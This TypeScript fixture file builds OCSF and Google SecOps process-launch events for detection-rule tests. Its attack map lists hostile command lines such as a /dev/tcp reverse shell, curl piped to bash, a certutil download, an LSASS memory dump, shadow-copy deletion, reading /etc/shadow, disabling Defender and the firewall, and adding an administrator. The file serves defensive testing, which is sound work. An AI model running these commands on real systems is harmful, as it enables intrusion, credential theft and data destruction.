import { JSONObject } from "../../../Types/JSON";

/*
 * Process launches as endpoint sources report them, for the tests that show
 * the rule library's endpoint rules fire on the process that ran.
 *
 * Every launch is written twice: as an OCSF 1.1 Process Activity: Launch
 * (class 1007, activity 1), the way a Sysmon event 1 or an auditd execve
 * maps onto OCSF, and as a Google SecOps UDM PROCESS_LAUNCH, the way the
 * SecOps Sysmon and auditd parsers write one. In both the parent is where
 * those sources put it - OCSF's actor process (with only the pid and name
 * under process.parent_process), UDM's principal process (with only the pid
 * under target.process.parent_process) - and the actor's process is never
 * the process that started.
 *
 * Not a test file itself (jest only collects *.test.ts).
 */

export interface ProcessSample {
  name: string;
  path: string;
  commandLine: string;
}

export interface ProcessLaunch {
  platform: "windows" | "linux";
  host: string;
  ip: string;
  user: string;
  process: ProcessSample;
  parent: ProcessSample;
}

const PROCESS_PID: number = 6532;
const PARENT_PID: number = 4120;

// 2026-10-21T09:15:00Z
const LAUNCH_TIME_IN_MS: number = 1792574100000;

// An OCSF 1.1 Process Activity: Launch.
export function ocsfProcessLaunch(
  launch: ProcessLaunch,
  uid: string,
): JSONObject {
  const windows: boolean = launch.platform === "windows";

  return {
    class_uid: 1007,
    class_name: "Process Activity",
    category_uid: 1,
    category_name: "System Activity",
    activity_id: 1,
    activity_name: "Launch",
    type_uid: 100701,
    severity_id: 1,
    severity: "Informational",
    status_id: 1,
    status: "Success",
    time: LAUNCH_TIME_IN_MS,
    metadata: {
      uid,
      version: "1.1.0",
      log_name: windows ? "Microsoft-Windows-Sysmon/Operational" : "auditd",
      product: windows
        ? { name: "Sysmon", vendor_name: "Microsoft" }
        : { name: "auditd", vendor_name: "Linux" },
    },
    device: {
      hostname: launch.host,
      ip: launch.ip,
      type_id: windows ? 2 : 1,
      os: windows
        ? { name: "Windows", type_id: 100 }
        : { name: "Linux", type_id: 200 },
    },
    actor: {
      user: { name: launch.user, type_id: 1 },
      process: {
        pid: PARENT_PID,
        name: launch.parent.name,
        cmd_line: launch.parent.commandLine,
        file: { name: launch.parent.name, path: launch.parent.path, type_id: 1 },
      },
    },
    process: {
      pid: PROCESS_PID,
      name: launch.process.name,
      cmd_line: launch.process.commandLine,
      file: {
        name: launch.process.name,
        path: launch.process.path,
        type_id: 1,
      },
      parent_process: { pid: PARENT_PID, name: launch.parent.name },
      user: { name: launch.user, type_id: 1 },
    },
  };
}

// A Google SecOps UDM PROCESS_LAUNCH.
export function udmProcessLaunch(
  launch: ProcessLaunch,
  uid: string,
): JSONObject {
  const windows: boolean = launch.platform === "windows";

  return {
    metadata: {
      id: uid,
      event_timestamp: new Date(LAUNCH_TIME_IN_MS).toISOString(),
      event_type: "PROCESS_LAUNCH",
      vendor_name: windows ? "Microsoft" : "Linux",
      product_name: windows ? "Microsoft-Windows-Sysmon" : "auditd",
      product_event_type: windows ? "1" : "EXECVE",
    },
    principal: {
      hostname: launch.host,
      ip: [launch.ip],
      user: { userid: launch.user },
      process: {
        pid: String(PARENT_PID),
        file: { full_path: launch.parent.path },
        command_line: launch.parent.commandLine,
      },
    },
    target: {
      process: {
        pid: String(PROCESS_PID),
        file: { full_path: launch.process.path },
        command_line: launch.process.commandLine,
        parent_process: { pid: String(PARENT_PID) },
      },
      user: { userid: launch.user },
    },
    security_result: [{ action: ["ALLOW"] }],
  };
}

const EXPLORER: ProcessSample = {
  name: "explorer.exe",
  path: "C:\\Windows\\explorer.exe",
  commandLine: "C:\\Windows\\Explorer.EXE",
};

const CMD: ProcessSample = {
  name: "cmd.exe",
  path: "C:\\Windows\\System32\\cmd.exe",
  commandLine: '"C:\\Windows\\system32\\cmd.exe"',
};

const SERVICES: ProcessSample = {
  name: "services.exe",
  path: "C:\\Windows\\System32\\services.exe",
  commandLine: "C:\\Windows\\system32\\services.exe",
};

const LOGIN_SHELL: ProcessSample = {
  name: "bash",
  path: "/usr/bin/bash",
  commandLine: "-bash",
};

const POWERSHELL_PATH: string =
  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

function windows(process: ProcessSample, parent: ProcessSample): ProcessLaunch {
  return {
    platform: "windows",
    host: "WKSTN-042",
    ip: "10.0.4.17",
    user: "CORP\\alice",
    process,
    parent,
  };
}

function linux(process: ProcessSample, parent: ProcessSample): ProcessLaunch {
  return {
    platform: "linux",
    host: "web-03",
    ip: "10.0.8.23",
    user: "www-data",
    process,
    parent,
  };
}

/*
 * One attack per library rule that reads process events, by the rule's
 * title: the command line each rule exists to catch, started by an ordinary
 * parent, so only the launched process's command line can give it away.
 */
export const ATTACK_LAUNCHES: Readonly<Record<string, ProcessLaunch>> = {
  "Encoded PowerShell command": windows(
    {
      name: "powershell.exe",
      path: POWERSHELL_PATH,
      commandLine:
        "powershell.exe -NoP -NonI -W Hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
    },
    {
      name: "WINWORD.EXE",
      path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
      commandLine:
        '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\alice\\Downloads\\invoice.docm"',
    },
  ),
  "Shadow copies deleted": windows(
    {
      name: "vssadmin.exe",
      path: "C:\\Windows\\System32\\vssadmin.exe",
      commandLine: '"C:\\Windows\\system32\\vssadmin.exe" delete shadows /all /quiet',
    },
    {
      name: "locker.exe",
      path: "C:\\Users\\alice\\AppData\\Local\\Temp\\locker.exe",
      commandLine: '"C:\\Users\\alice\\AppData\\Local\\Temp\\locker.exe"',
    },
  ),
  "Credential dumping tool": windows(
    {
      name: "rundll32.exe",
      path: "C:\\Windows\\System32\\rundll32.exe",
      commandLine:
        '"C:\\Windows\\System32\\rundll32.exe" C:\\Windows\\System32\\comsvcs.dll, MiniDump 652 C:\\Users\\Public\\lsass.dmp full',
    },
    {
      name: "powershell.exe",
      path: POWERSHELL_PATH,
      commandLine: "powershell.exe -ExecutionPolicy Bypass",
    },
  ),
  "File downloaded with certutil": windows(
    {
      name: "certutil.exe",
      path: "C:\\Windows\\System32\\certutil.exe",
      commandLine:
        "certutil.exe -urlcache -split -f http://203.0.113.7/a.exe C:\\Users\\Public\\a.exe",
    },
    CMD,
  ),
  "Download piped into a shell": linux(
    {
      name: "sh",
      path: "/usr/bin/sh",
      commandLine: "/bin/sh -c curl -fsSL http://203.0.113.7/x.sh | bash",
    },
    { name: "cron", path: "/usr/sbin/cron", commandLine: "/usr/sbin/CRON -f" },
  ),
  "Reverse shell": linux(
    {
      name: "bash",
      path: "/usr/bin/bash",
      commandLine: "bash -c bash -i >& /dev/tcp/203.0.113.7/4444 0>&1",
    },
    {
      name: "php-fpm8.2",
      path: "/usr/sbin/php-fpm8.2",
      commandLine: "php-fpm: pool www",
    },
  ),
  "Shell history cleared or disabled": linux(
    {
      name: "bash",
      path: "/usr/bin/bash",
      commandLine: "bash -c unset HISTFILE",
    },
    {
      name: "sshd",
      path: "/usr/sbin/sshd",
      commandLine: "sshd: alice@pts/0",
    },
  ),
  "Password hashes read on Linux": linux(
    { name: "cat", path: "/usr/bin/cat", commandLine: "cat /etc/shadow" },
    LOGIN_SHELL,
  ),
  "Scheduled task created": windows(
    {
      name: "schtasks.exe",
      path: "C:\\Windows\\System32\\schtasks.exe",
      commandLine:
        'schtasks.exe /create /tn "OneDrive Update" /tr "C:\\Users\\Public\\update.exe" /sc onlogon /ru SYSTEM /f',
    },
    CMD,
  ),
  "Service installed from the command line": windows(
    {
      name: "sc.exe",
      path: "C:\\Windows\\System32\\sc.exe",
      commandLine:
        'sc.exe create WinUpdSvc binPath= "C:\\Users\\Public\\svc.exe" start= auto',
    },
    CMD,
  ),
  "Cryptocurrency miner": linux(
    {
      name: "xmrig",
      path: "/tmp/.x/xmrig",
      commandLine:
        "/tmp/.x/xmrig -o stratum+tcp://pool.example.net:3333 -u 4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx -p x --donate-level 1",
    },
    LOGIN_SHELL,
  ),
  "Antivirus protection turned off": windows(
    {
      name: "powershell.exe",
      path: POWERSHELL_PATH,
      commandLine:
        'powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
    },
    CMD,
  ),
  "Host firewall turned off": windows(
    {
      name: "netsh.exe",
      path: "C:\\Windows\\System32\\netsh.exe",
      commandLine: "netsh advfirewall set allprofiles state off",
    },
    CMD,
  ),
  "Local administrator added": windows(
    {
      name: "net.exe",
      path: "C:\\Windows\\System32\\net.exe",
      commandLine: "net localgroup administrators svc_backup /add",
    },
    CMD,
  ),
};

/*
 * What an endpoint starts all day, including the harmless relatives of the
 * attacks above (a shadow copy listed, a task queried, a download saved to
 * a file) and a harmless process whose PARENT ran an encoded command: the
 * rules read the process that started, not the one that started it.
 */
export const ORDINARY_LAUNCHES: Readonly<Record<string, ProcessLaunch>> = {
  "a service host": windows(
    {
      name: "svchost.exe",
      path: "C:\\Windows\\System32\\svchost.exe",
      commandLine: "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
    },
    SERVICES,
  ),
  "a PowerShell script": windows(
    {
      name: "powershell.exe",
      path: POWERSHELL_PATH,
      commandLine:
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\nightly-backup.ps1",
    },
    SERVICES,
  ),
  "a browser tab": windows(
    {
      name: "chrome.exe",
      path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
      commandLine:
        '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer --lang=en-US',
    },
    EXPLORER,
  ),
  "shadow copies listed": windows(
    {
      name: "vssadmin.exe",
      path: "C:\\Windows\\System32\\vssadmin.exe",
      commandLine: "vssadmin list shadows",
    },
    CMD,
  ),
  "scheduled tasks listed": windows(
    {
      name: "schtasks.exe",
      path: "C:\\Windows\\System32\\schtasks.exe",
      commandLine: "schtasks /query /fo LIST /v",
    },
    CMD,
  ),
  "a service queried": windows(
    {
      name: "sc.exe",
      path: "C:\\Windows\\System32\\sc.exe",
      commandLine: "sc.exe query wuauserv",
    },
    CMD,
  ),
  "the administrators listed": windows(
    {
      name: "net.exe",
      path: "C:\\Windows\\System32\\net.exe",
      commandLine: "net localgroup administrators",
    },
    CMD,
  ),
  "a console host under an encoded PowerShell": windows(
    {
      name: "conhost.exe",
      path: "C:\\Windows\\System32\\conhost.exe",
      commandLine: "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
    },
    {
      name: "powershell.exe",
      path: POWERSHELL_PATH,
      commandLine: "powershell.exe -NoP -W Hidden -enc JABzAD0ATgBlAHcA",
    },
  ),
  "a package update": linux(
    {
      name: "apt-get",
      path: "/usr/bin/apt-get",
      commandLine: "apt-get update",
    },
    { name: "sudo", path: "/usr/bin/sudo", commandLine: "sudo apt-get update" },
  ),
  "a download saved to a file": linux(
    {
      name: "curl",
      path: "/usr/bin/curl",
      commandLine: "curl -fsSL https://example.com/install.sh -o /tmp/install.sh",
    },
    LOGIN_SHELL,
  ),
  "the hosts file read": linux(
    { name: "cat", path: "/usr/bin/cat", commandLine: "cat /etc/hosts" },
    LOGIN_SHELL,
  ),
};
